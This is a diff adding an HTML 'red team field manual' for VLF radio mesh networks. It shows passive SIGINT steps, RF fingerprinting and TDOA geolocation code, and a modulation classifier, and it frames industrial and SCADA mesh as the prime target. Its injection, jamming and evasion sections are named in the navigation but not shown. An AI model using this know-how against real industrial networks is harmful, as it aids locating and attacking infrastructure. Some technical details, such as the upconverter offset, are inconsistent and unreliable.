@@ -1,0 +1,1627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VLF MESH // RED TEAM FIELD MANUAL</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap');
+
+  :root {
+    --bg: #050a08;
+    --bg2: #080f0b;
+    --panel: #0a1410;
+    --border: #1a3a2a;
+    --green: #00ff88;
+    --green-dim: #00cc66;
+    --green-dark: #003a1a;
+    --amber: #ffaa00;
+    --red: #ff3355;
+    --cyan: #00ccff;
+    --text: #a0d4b8;
+    --text-dim: #4a7a5a;
+    --scan: rgba(0,255,136,0.03);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Space Mono', monospace;
+    font-size: 13px;
+    line-height: 1.7;
+    overflow-x: hidden;
+    cursor: crosshair;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.15) 2px,
+      rgba(0,0,0,0.15) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* CRT flicker */
+  @keyframes flicker {
+    0%, 100% { opacity: 1; }
+    92% { opacity: 1; }
+    93% { opacity: 0.85; }
+    94% { opacity: 1; }
+    96% { opacity: 0.9; }
+    97% { opacity: 1; }
+  }
+  body { animation: flicker 8s infinite; }
+
+  /* Header */
+  .header {
+    border-bottom: 1px solid var(--border);
+    padding: 20px 40px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: sticky;
+    top: 0;
+    background: var(--bg);
+    z-index: 100;
+  }
+
+  .logo {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 22px;
+    font-weight: 900;
+    color: var(--green);
+    letter-spacing: 4px;
+    text-shadow: 0 0 20px rgba(0,255,136,0.5);
+  }
+  .logo span { color: var(--red); }
+
+  .header-meta {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    text-align: right;
+  }
+  .header-meta .status {
+    color: var(--green);
+    animation: blink 1.5s infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+  /* Nav */
+  .nav {
+    display: flex;
+    gap: 0;
+    border-bottom: 1px solid var(--border);
+    overflow-x: auto;
+    scrollbar-width: none;
+  }
+  .nav::-webkit-scrollbar { display: none; }
+
+  .nav-tab {
+    padding: 12px 20px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    cursor: pointer;
+    border-right: 1px solid var(--border);
+    border-bottom: 2px solid transparent;
+    white-space: nowrap;
+    transition: all 0.2s;
+    user-select: none;
+  }
+  .nav-tab:hover { color: var(--green); background: var(--green-dark); }
+  .nav-tab.active {
+    color: var(--green);
+    border-bottom-color: var(--green);
+    background: var(--panel);
+    text-shadow: 0 0 10px rgba(0,255,136,0.4);
+  }
+
+  /* Main layout */
+  .main { display: flex; min-height: calc(100vh - 120px); }
+
+  /* Sidebar */
+  .sidebar {
+    width: 260px;
+    min-width: 260px;
+    border-right: 1px solid var(--border);
+    padding: 20px 0;
+    position: sticky;
+    top: 61px;
+    height: calc(100vh - 61px);
+    overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+
+  .sidebar-section {
+    padding: 8px 20px 4px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    letter-spacing: 3px;
+    color: var(--text-dim);
+    margin-top: 12px;
+  }
+
+  .sidebar-item {
+    padding: 8px 20px;
+    font-size: 12px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    transition: all 0.15s;
+    border-left: 2px solid transparent;
+  }
+  .sidebar-item:hover { background: var(--panel); color: var(--green); border-left-color: var(--green-dim); }
+  .sidebar-item.active { color: var(--green); border-left-color: var(--green); background: var(--green-dark); }
+  .sidebar-item .dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--text-dim);
+    flex-shrink: 0;
+  }
+  .sidebar-item.active .dot { background: var(--green); box-shadow: 0 0 6px var(--green); }
+
+  /* Content */
+  .content {
+    flex: 1;
+    padding: 40px;
+    max-width: 900px;
+  }
+
+  /* Section panels */
+  .section { display: none; }
+  .section.active { display: block; }
+
+  /* Page title */
+  .page-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--green);
+    letter-spacing: 3px;
+    margin-bottom: 6px;
+    text-shadow: 0 0 30px rgba(0,255,136,0.3);
+  }
+  .page-subtitle {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    margin-bottom: 32px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 20px;
+  }
+
+  /* Cards */
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    padding: 24px;
+    margin-bottom: 20px;
+    position: relative;
+    overflow: hidden;
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--green-dim), transparent);
+    opacity: 0.4;
+  }
+
+  .card-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--green);
+    letter-spacing: 2px;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .card-title .tag {
+    font-size: 9px;
+    padding: 2px 8px;
+    border: 1px solid;
+    border-radius: 2px;
+    letter-spacing: 1px;
+  }
+  .tag-red { color: var(--red); border-color: var(--red); }
+  .tag-amber { color: var(--amber); border-color: var(--amber); }
+  .tag-cyan { color: var(--cyan); border-color: var(--cyan); }
+  .tag-green { color: var(--green); border-color: var(--green); }
+
+  /* Code blocks */
+  .code-block {
+    background: #020805;
+    border: 1px solid var(--green-dark);
+    border-left: 3px solid var(--green);
+    padding: 16px 20px;
+    margin: 12px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    line-height: 1.8;
+    overflow-x: auto;
+    position: relative;
+  }
+  .code-block .comment { color: var(--text-dim); }
+  .code-block .keyword { color: var(--cyan); }
+  .code-block .string { color: var(--amber); }
+  .code-block .number { color: var(--green); }
+  .code-label {
+    font-size: 9px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    font-family: 'Share Tech Mono', monospace;
+  }
+
+  /* Warning boxes */
+  .warning {
+    border: 1px solid var(--red);
+    background: rgba(255,51,85,0.05);
+    padding: 12px 16px;
+    margin: 12px 0;
+    font-size: 12px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+  }
+  .warning::before { content: '⚠'; color: var(--red); flex-shrink: 0; }
+
+  .info-box {
+    border: 1px solid var(--cyan);
+    background: rgba(0,204,255,0.03);
+    padding: 12px 16px;
+    margin: 12px 0;
+    font-size: 12px;
+  }
+
+  /* Spec table */
+  .spec-table { width: 100%; border-collapse: collapse; margin: 12px 0; }
+  .spec-table th {
+    text-align: left;
+    padding: 8px 12px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    border-bottom: 1px solid var(--border);
+  }
+  .spec-table td {
+    padding: 8px 12px;
+    border-bottom: 1px solid rgba(26,58,42,0.5);
+    font-size: 12px;
+    vertical-align: top;
+  }
+  .spec-table tr:hover td { background: rgba(0,255,136,0.02); }
+  .spec-table .val { color: var(--green); font-family: 'Share Tech Mono', monospace; }
+  .spec-table .highlight { color: var(--amber); }
+
+  /* Steps */
+  .steps { counter-reset: step; }
+  .step {
+    display: flex;
+    gap: 16px;
+    margin-bottom: 16px;
+    counter-increment: step;
+  }
+  .step-num {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 18px;
+    font-weight: 900;
+    color: var(--green-dark);
+    min-width: 32px;
+    text-align: right;
+    padding-top: 2px;
+  }
+  .step-num::before { content: counter(step, decimal-leading-zero); color: var(--green-dim); }
+  .step-content h4 { color: var(--green); font-size: 13px; margin-bottom: 4px; font-family: 'Orbitron', sans-serif; font-size: 11px; letter-spacing: 1px; }
+
+  /* Frequency chart */
+  .freq-chart {
+    background: #020805;
+    border: 1px solid var(--green-dark);
+    padding: 20px;
+    margin: 12px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+  }
+  .freq-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 8px;
+  }
+  .freq-label { width: 100px; color: var(--text-dim); text-align: right; }
+  .freq-bar-wrap { flex: 1; background: rgba(0,255,136,0.05); height: 18px; position: relative; }
+  .freq-bar {
+    height: 100%;
+    background: linear-gradient(90deg, var(--green-dark), var(--green));
+    display: flex;
+    align-items: center;
+    padding-left: 6px;
+    font-size: 10px;
+    color: var(--green);
+    transition: width 1s ease;
+  }
+  .freq-note { width: 180px; color: var(--text-dim); font-size: 10px; }
+
+  /* Attack chain */
+  .attack-chain {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    margin: 16px 0;
+  }
+  .attack-step {
+    display: flex;
+    gap: 0;
+    align-items: stretch;
+  }
+  .attack-step-connector {
+    width: 40px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .attack-step-connector .circle {
+    width: 12px; height: 12px;
+    border: 2px solid var(--green);
+    border-radius: 50%;
+    background: var(--bg);
+    z-index: 1;
+    flex-shrink: 0;
+    margin-top: 14px;
+  }
+  .attack-step-connector .line {
+    width: 2px;
+    flex: 1;
+    background: var(--border);
+    margin: 0 auto;
+  }
+  .attack-step:last-child .line { display: none; }
+  .attack-step-body {
+    flex: 1;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 12px 16px;
+    margin-bottom: 4px;
+    margin-left: 0;
+  }
+  .attack-step-body h4 { color: var(--green); font-size: 11px; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; margin-bottom: 4px; }
+  .attack-step-body p { font-size: 12px; color: var(--text); margin-bottom: 4px; }
+  .attack-step-body code { color: var(--amber); font-size: 11px; }
+
+  /* Tool pills */
+  .tools { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 8px; }
+  .tool-pill {
+    padding: 3px 10px;
+    border: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--cyan);
+    border-color: rgba(0,204,255,0.3);
+    background: rgba(0,204,255,0.03);
+  }
+
+  /* Pulse animation for active elements */
+  @keyframes pulse-border {
+    0%, 100% { border-color: var(--border); }
+    50% { border-color: var(--green-dim); }
+  }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); }
+  ::-webkit-scrollbar-thumb:hover { background: var(--green-dark); }
+
+  /* Waterfall viz */
+  .waterfall {
+    background: #000;
+    border: 1px solid var(--green-dark);
+    height: 120px;
+    margin: 12px 0;
+    position: relative;
+    overflow: hidden;
+  }
+  .waterfall canvas { width: 100%; height: 100%; }
+
+  /* Signal meter */
+  .signal-meter {
+    display: flex;
+    gap: 3px;
+    align-items: flex-end;
+    height: 30px;
+    margin: 8px 0;
+  }
+  .signal-bar {
+    width: 8px;
+    background: var(--green);
+    border-radius: 1px 1px 0 0;
+    animation: signal-anim 2s infinite;
+  }
+  @keyframes signal-anim {
+    0%, 100% { opacity: 0.3; }
+    50% { opacity: 1; }
+  }
+
+  /* Highlight text */
+  .hl-green { color: var(--green); }
+  .hl-amber { color: var(--amber); }
+  .hl-red { color: var(--red); }
+  .hl-cyan { color: var(--cyan); }
+
+  p { margin-bottom: 10px; }
+  ul, ol { margin-left: 20px; margin-bottom: 10px; }
+  li { margin-bottom: 4px; }
+  h3 { font-family: 'Orbitron', sans-serif; font-size: 14px; color: var(--green); letter-spacing: 2px; margin: 20px 0 10px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">VLF<span>//</span>RED TEAM</div>
+  <div class="header-meta">
+    FIELD MANUAL v2.4 // TS-SCI<br>
+    <span class="status">● ACTIVE SESSION</span> // RT-OPS CLEARANCE
+  </div>
+</div>
+
+<div class="nav">
+  <div class="nav-tab active" onclick="showSection('recon')">01 // RECON & SIGINT</div>
+  <div class="nav-tab" onclick="showSection('protocol')">02 // PROTOCOL ANALYSIS</div>
+  <div class="nav-tab" onclick="showSection('hardware')">03 // HARDWARE SETUP</div>
+  <div class="nav-tab" onclick="showSection('gnuradio')">04 // GNU RADIO</div>
+  <div class="nav-tab" onclick="showSection('injection')">05 // INJECTION & SPOOFING</div>
+  <div class="nav-tab" onclick="showSection('interference')">06 // INTERFERENCE OPS</div>
+  <div class="nav-tab" onclick="showSection('opsec')">07 // OPSEC</div>
+</div>
+
+<div class="main">
+  <div class="sidebar">
+    <div class="sidebar-section">RECON & SIGINT</div>
+    <div class="sidebar-item active" onclick="showSection('recon')"><div class="dot"></div>Passive Monitoring</div>
+    <div class="sidebar-item" onclick="showSection('recon')"><div class="dot"></div>SDR Configuration</div>
+    <div class="sidebar-item" onclick="showSection('recon')"><div class="dot"></div>Signal Fingerprinting</div>
+
+    <div class="sidebar-section">PROTOCOL</div>
+    <div class="sidebar-item" onclick="showSection('protocol')"><div class="dot"></div>Demodulation</div>
+    <div class="sidebar-item" onclick="showSection('protocol')"><div class="dot"></div>Frame Analysis</div>
+    <div class="sidebar-item" onclick="showSection('protocol')"><div class="dot"></div>Known Protocols</div>
+
+    <div class="sidebar-section">HARDWARE</div>
+    <div class="sidebar-item" onclick="showSection('hardware')"><div class="dot"></div>Antenna Design</div>
+    <div class="sidebar-item" onclick="showSection('hardware')"><div class="dot"></div>SDR Selection</div>
+    <div class="sidebar-item" onclick="showSection('hardware')"><div class="dot"></div>Upconverters</div>
+
+    <div class="sidebar-section">GNU RADIO</div>
+    <div class="sidebar-item" onclick="showSection('gnuradio')"><div class="dot"></div>Flowgraph Setup</div>
+    <div class="sidebar-item" onclick="showSection('gnuradio')"><div class="dot"></div>VLF Pipeline</div>
+    <div class="sidebar-item" onclick="showSection('gnuradio')"><div class="dot"></div>Recording & Replay</div>
+
+    <div class="sidebar-section">OFFENSIVE</div>
+    <div class="sidebar-item" onclick="showSection('injection')"><div class="dot"></div>Packet Injection</div>
+    <div class="sidebar-item" onclick="showSection('injection')"><div class="dot"></div>Node Spoofing</div>
+    <div class="sidebar-item" onclick="showSection('interference')"><div class="dot"></div>Jamming Techniques</div>
+    <div class="sidebar-item" onclick="showSection('interference')"><div class="dot"></div>Mesh Partitioning</div>
+
+    <div class="sidebar-section">OPSEC</div>
+    <div class="sidebar-item" onclick="showSection('opsec')"><div class="dot"></div>RF Signature Control</div>
+    <div class="sidebar-item" onclick="showSection('opsec')"><div class="dot"></div>Detection Evasion</div>
+  </div>
+
+  <div class="content">
+
+    <!-- ==================== SECTION 1: RECON ==================== -->
+    <div class="section active" id="section-recon">
+      <div class="page-title">PASSIVE RECON // SIGINT</div>
+      <div class="page-subtitle">TASK RT-2 THROUGH RT-8 // PHASE 1: NO EMISSIONS</div>
+
+      <div class="card">
+        <div class="card-title">VLF FREQUENCY LANDSCAPE <span class="tag tag-cyan">REFERENCE</span></div>
+        <p>Before any operation, understand what's already in the band. The VLF spectrum is sparse but rich with intel value — know every occupant.</p>
+        <div class="freq-chart">
+          <div class="freq-row">
+            <div class="freq-label">3–10 kHz</div>
+            <div class="freq-bar-wrap"><div class="freq-bar" style="width:30%">SUBMARINE COMMS (NATO)</div></div>
+            <div class="freq-note">ELF bleedover, SLF nav</div>
+          </div>
+          <div class="freq-row">
+            <div class="freq-label">10–14 kHz</div>
+            <div class="freq-bar-wrap"><div class="freq-bar" style="width:45%">NAA/NWC/NML MILITARY TX</div></div>
+            <div class="freq-note">US Navy legacy stations</div>
+          </div>
+          <div class="freq-row">
+            <div class="freq-label">14–20 kHz</div>
+            <div class="freq-bar-wrap"><div class="freq-bar" style="width:70%">PRIME TARGET ZONE</div></div>
+            <div class="freq-note">Industrial mesh, SCADA</div>
+          </div>
+          <div class="freq-row">
+            <div class="freq-label">20–25 kHz</div>
+            <div class="freq-bar-wrap"><div class="freq-bar" style="width:85%">ALPHA / OMEGA REMNANTS</div></div>
+            <div class="freq-note">Navigation, timing refs</div>
+          </div>
+          <div class="freq-row">
+            <div class="freq-label">60 kHz</div>
+            <div class="freq-bar-wrap"><div class="freq-bar" style="width:55%">WWVB TIME SIGNAL</div></div>
+            <div class="freq-note">NIST time standard</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">PASSIVE MONITORING SETUP <span class="tag tag-green">PHASE 1</span></div>
+        <p>Your first 72 hours are purely passive. No transmissions, no active probing. Build a complete picture of baseline behavior.</p>
+
+        <div class="steps">
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>DEPLOY RECEIVING ANTENNA</h4>
+              <p>VLF requires large antennas. A simple long-wire (30–100m) or magnetic loop antenna (1–3m diameter) will capture signals effectively. Orient for maximum signal pickup from known transmitter directions.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>CONFIGURE SDR + UPCONVERTER</h4>
+              <p>Most SDRs bottom out at 500 kHz. You need a VLF upconverter (e.g., Ham-It-Up, SpyVerter) to shift the VLF band up into receivable range. Set center frequency to 125 kHz (with 125 kHz upconverter offset).</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>ESTABLISH NOISE FLOOR BASELINE</h4>
+              <p>Run continuous IQ recording for minimum 72 hours. Log signal strength, timestamps, and any burst patterns. Power grid interference at 50/60 Hz harmonics will be heavy — notch filter aggressively.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>CORRELATE AGAINST OPERATIONAL PATTERNS</h4>
+              <p>Compare transmission timing against shift changes, facility schedules, environmental events. Predictable transmission windows reveal operational rhythms and confirm active nodes.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="code-label">// GQRX CONFIGURATION — VLF PASSIVE MONITORING</div>
+        <div class="code-block">
+<span class="comment"># ~/.config/gqrx/default.conf — VLF optimized settings</span>
+<span class="keyword">input</span>:
+  device:    <span class="string">"rtl=0,offset_tune=1"</span>
+  frequency: <span class="number">125000</span>          <span class="comment"># 125 kHz center + upconverter offset</span>
+  lnb_lo:   <span class="number">-125000000</span>       <span class="comment"># subtract 125 MHz upconverter LO</span>
+  sample_rate: <span class="number">250000</span>
+  bandwidth: <span class="number">30000</span>            <span class="comment"># captures full VLF band 3-30kHz</span>
+
+<span class="keyword">receiver</span>:
+  demod:     <span class="number">0</span>               <span class="comment"># raw IQ for analysis</span>
+  agc:       <span class="keyword">false</span>           <span class="comment"># manual gain for consistent baseline</span>
+  rf_gain:   <span class="number">28</span>
+  if_gain:   <span class="number">32</span>
+
+<span class="keyword">fft</span>:
+  size:      <span class="number">32768</span>           <span class="comment"># high resolution for VLF detail</span>
+  rate:      <span class="number">25</span>
+  averaging: <span class="number">75</span>              <span class="comment"># smooth noisy baseline</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">SIGNAL FINGERPRINTING <span class="tag tag-amber">ANALYSIS</span></div>
+        <p>Each VLF mesh node has a characteristic RF signature — like a fingerprint. Capture and catalog these to track individual nodes.</p>
+
+        <table class="spec-table">
+          <tr>
+            <th>PARAMETER</th>
+            <th>WHAT TO MEASURE</th>
+            <th>TOOL</th>
+            <th>INTEL VALUE</th>
+          </tr>
+          <tr>
+            <td>Carrier frequency</td>
+            <td class="val">±0.1 Hz resolution</td>
+            <td>Inspectrum / URH</td>
+            <td class="highlight">Node ID correlation</td>
+          </tr>
+          <tr>
+            <td>Modulation type</td>
+            <td class="val">OOK/FSK/MSK/BPSK</td>
+            <td>GNU Radio / URH</td>
+            <td class="highlight">Protocol family ID</td>
+          </tr>
+          <tr>
+            <td>Symbol rate</td>
+            <td class="val">baud measurement</td>
+            <td>Inspectrum</td>
+            <td class="highlight">Bandwidth, data rate</td>
+          </tr>
+          <tr>
+            <td>Burst timing</td>
+            <td class="val">TX duration, cadence</td>
+            <td>Custom logging</td>
+            <td class="highlight">Operational patterns</td>
+          </tr>
+          <tr>
+            <td>Rise/fall time</td>
+            <td class="val">μs precision</td>
+            <td>Oscilloscope / SDR</td>
+            <td class="highlight">Hardware fingerprint</td>
+          </tr>
+          <tr>
+            <td>Frequency drift</td>
+            <td class="val">Hz/min over time</td>
+            <td>GNU Radio plot</td>
+            <td class="highlight">TCXO vs OCXO quality</td>
+          </tr>
+        </table>
+
+        <div class="code-label">// PYTHON — AUTOMATED SIGNAL FINGERPRINT LOGGER</div>
+        <div class="code-block">
+<span class="keyword">import</span> numpy <span class="keyword">as</span> np
+<span class="keyword">from</span> scipy <span class="keyword">import</span> signal
+<span class="keyword">import</span> datetime, json
+
+<span class="keyword">def</span> <span class="string">fingerprint_burst</span>(iq_samples, sample_rate=<span class="number">250000</span>):
+    <span class="comment">"""Extract RF fingerprint from captured IQ burst"""</span>
+
+    <span class="comment"># Instantaneous frequency via Hilbert transform</span>
+    analytic = signal.hilbert(iq_samples)
+    inst_phase = np.unwrap(np.angle(analytic))
+    inst_freq = np.diff(inst_phase) / (<span class="number">2.0</span> * np.pi) * sample_rate
+
+    <span class="comment"># Power envelope for timing characterization</span>
+    envelope = np.abs(analytic)
+
+    <span class="comment"># Rise time: 10% to 90% of peak power</span>
+    peak = np.max(envelope)
+    rise_start = np.argmax(envelope > peak * <span class="number">0.1</span>)
+    rise_end = np.argmax(envelope > peak * <span class="number">0.9</span>)
+    rise_time_us = (rise_end - rise_start) / sample_rate * <span class="number">1e6</span>
+
+    <span class="comment"># Center frequency estimation</span>
+    freqs = np.fft.rfftfreq(len(iq_samples), <span class="number">1</span>/sample_rate)
+    fft_mag = np.abs(np.fft.rfft(iq_samples))
+    center_freq = freqs[np.argmax(fft_mag)]
+
+    fp = {
+        <span class="string">"timestamp"</span>:   datetime.datetime.utcnow().isoformat(),
+        <span class="string">"center_hz"</span>:   <span class="keyword">round</span>(center_freq, <span class="number">2</span>),
+        <span class="string">"rise_us"</span>:     <span class="keyword">round</span>(rise_time_us, <span class="number">3</span>),
+        <span class="string">"mean_freq_hz"</span>: <span class="keyword">round</span>(np.mean(inst_freq), <span class="number">4</span>),
+        <span class="string">"freq_std"</span>:    <span class="keyword">round</span>(np.std(inst_freq), <span class="number">6</span>),
+        <span class="string">"burst_dur_ms"</span>: <span class="keyword">round</span>(len(iq_samples)/sample_rate*<span class="number">1000</span>, <span class="number">2</span>)
+    }
+    <span class="keyword">return</span> fp
+
+<span class="comment"># Save fingerprint database</span>
+<span class="keyword">with</span> <span class="keyword">open</span>(<span class="string">'vlf_fingerprints.jsonl'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:
+    f.write(json.dumps(fingerprint_burst(captured_iq)) + <span class="string">'\n'</span>)
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">TDOA GEOLOCATION <span class="tag tag-red">ACTIVE-ADJACENT</span></div>
+        <div class="warning">Requires minimum 3 synchronized receiver positions. Use GPS-disciplined receivers or white-rabbit timing for sub-microsecond sync. Position accuracy degrades significantly without precise timing.</div>
+        <p>Time Difference of Arrival (TDOA) allows triangulation of VLF transmitters using multiple passive receivers — no emissions required from your side.</p>
+        <div class="code-label">// TDOA POSITION ESTIMATION — HYPERBOLIC INTERSECTION</div>
+        <div class="code-block">
+<span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> minimize
+<span class="keyword">import</span> numpy <span class="keyword">as</span> np
+
+<span class="comment"># Receiver positions [lat, lon] — GPS surveyed</span>
+receivers = np.array([
+    [<span class="number">38.8951</span>, <span class="number">-77.0364</span>],   <span class="comment"># RX-A</span>
+    [<span class="number">38.9072</span>, <span class="number">-77.0401</span>],   <span class="comment"># RX-B</span>
+    [<span class="number">38.8820</span>, <span class="number">-77.0198</span>],   <span class="comment"># RX-C</span>
+])
+
+<span class="comment"># Time delays in microseconds (from cross-correlation)</span>
+tdoa = np.array([<span class="number">0.0</span>, <span class="number">12.4</span>, <span class="number">-8.7</span>])  <span class="comment"># relative to RX-A</span>
+c = <span class="number">299792458</span>  <span class="comment"># m/s</span>
+
+<span class="keyword">def</span> <span class="string">tdoa_cost</span>(pos):
+    <span class="comment">"""Cost function: minimize sum of squared TDOA residuals"""</span>
+    dists = np.sqrt(np.sum((receivers - pos)**<span class="number">2</span>, axis=<span class="number">1</span>)) * <span class="number">111320</span>
+    predicted_tdoa = (dists - dists[<span class="number">0</span>]) / (c * <span class="number">1e-6</span>)
+    <span class="keyword">return</span> np.sum((predicted_tdoa - tdoa)**<span class="number">2</span>)
+
+result = minimize(tdoa_cost, x0=np.mean(receivers, axis=<span class="number">0</span>),
+                  method=<span class="string">'Nelder-Mead'</span>)
+print(f<span class="string">"Estimated TX position: {result.x}"</span>)
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SECTION 2: PROTOCOL ==================== -->
+    <div class="section" id="section-protocol">
+      <div class="page-title">PROTOCOL ANALYSIS</div>
+      <div class="page-subtitle">TASK RT-9 THROUGH RT-18 // REVERSE ENGINEERING THE STACK</div>
+
+      <div class="card">
+        <div class="card-title">MODULATION IDENTIFICATION <span class="tag tag-cyan">STEP 1</span></div>
+        <p>Before you can decode anything, you must identify the modulation scheme. VLF mesh systems typically use one of these:</p>
+
+        <table class="spec-table">
+          <tr><th>MODULATION</th><th>VISUAL SIGNATURE</th><th>COMMON USE</th><th>DECODE TOOL</th></tr>
+          <tr>
+            <td class="val">OOK</td>
+            <td>On/off carrier, square bursts</td>
+            <td>Simple sensors, legacy</td>
+            <td>URH, custom threshold</td>
+          </tr>
+          <tr>
+            <td class="val">2-FSK</td>
+            <td>Two freq lines in waterfall</td>
+            <td>SCADA, telemetry</td>
+            <td>GNU Radio, direwolf</td>
+          </tr>
+          <tr>
+            <td class="val">MSK</td>
+            <td>Continuous phase, smooth</td>
+            <td>Military, high reliability</td>
+            <td>GNU Radio MSK block</td>
+          </tr>
+          <tr>
+            <td class="val">BPSK</td>
+            <td>Phase reversals on carrier</td>
+            <td>Nav systems, STANAG</td>
+            <td>GNU Radio BPSK demod</td>
+          </tr>
+          <tr>
+            <td class="val">OFDM (rare)</td>
+            <td>Multiple subcarriers</td>
+            <td>High-end mesh nodes</td>
+            <td>GNU Radio OFDM blocks</td>
+          </tr>
+        </table>
+
+        <div class="code-label">// PYTHON — AUTOMATIC MODULATION CLASSIFIER</div>
+        <div class="code-block">
+<span class="keyword">import</span> numpy <span class="keyword">as</span> np
+<span class="keyword">from</span> scipy.stats <span class="keyword">import</span> kurtosis
+
+<span class="keyword">def</span> <span class="string">classify_modulation</span>(iq, fs):
+    <span class="comment">"""Heuristic modulation classifier for VLF signals"""</span>
+    analytic  = iq / (np.abs(iq) + <span class="number">1e-10</span>)  <span class="comment"># normalize</span>
+    phase     = np.angle(analytic)
+    amplitude = np.abs(iq)
+    inst_freq = np.diff(np.unwrap(phase)) * fs / (<span class="number">2</span>*np.pi)
+
+    amp_variance  = np.var(amplitude)
+    phase_jumps   = np.sum(np.abs(np.diff(phase)) > np.pi/2)
+    freq_clusters = len(np.unique(np.round(inst_freq, -<span class="number">1</span>)))
+
+    <span class="keyword">if</span> amp_variance > <span class="number">0.3</span> <span class="keyword">and</span> phase_jumps < <span class="number">10</span>:
+        <span class="keyword">return</span> <span class="string">"OOK"</span>
+    <span class="keyword">elif</span> freq_clusters <= <span class="number">3</span> <span class="keyword">and</span> amp_variance < <span class="number">0.05</span>:
+        <span class="keyword">return</span> <span class="string">"FSK"</span>
+    <span class="keyword">elif</span> phase_jumps > <span class="number">50</span> <span class="keyword">and</span> amp_variance < <span class="number">0.05</span>:
+        <span class="keyword">return</span> <span class="string">"BPSK/MSK"</span>
+    <span class="keyword">else</span>:
+        <span class="keyword">return</span> <span class="string">"UNKNOWN — manual analysis required"</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">FRAME STRUCTURE ANALYSIS <span class="tag tag-amber">STEP 2</span></div>
+        <p>Once demodulated to a bitstream, find the frame structure. Look for repeating patterns that reveal sync words, addresses, and payload boundaries.</p>
+
+        <div class="code-label">// INSPECTRUM WORKFLOW — FRAME DISSECTION</div>
+        <div class="code-block">
+<span class="comment"># Step 1: Open captured IQ in Inspectrum</span>
+inspectrum -r <span class="number">250000</span> capture_vlf_node_A.iq8
+
+<span class="comment"># Step 2: Set symbol rate (measure from waterfall spacing)</span>
+<span class="comment">#   → Right-click → "Set symbol rate" → enter measured baud</span>
+
+<span class="comment"># Step 3: Export symbols to file for analysis</span>
+<span class="comment">#   → Analysis → Export symbols → vlf_symbols.txt</span>
+        </div>
+
+        <div class="code-label">// PYTHON — SYNC WORD SEARCH & FRAME BOUNDARY DETECTION</div>
+        <div class="code-block">
+<span class="keyword">import</span> numpy <span class="keyword">as</span> np
+
+<span class="keyword">def</span> <span class="string">find_sync_words</span>(bitstream, min_len=<span class="number">8</span>, max_len=<span class="number">32</span>, threshold=<span class="number">0.95</span>):
+    <span class="comment">"""Find repeating bit patterns that indicate sync/preamble words"""</span>
+    candidates = {}
+
+    <span class="keyword">for</span> word_len <span class="keyword">in</span> range(min_len, max_len+<span class="number">1</span>):
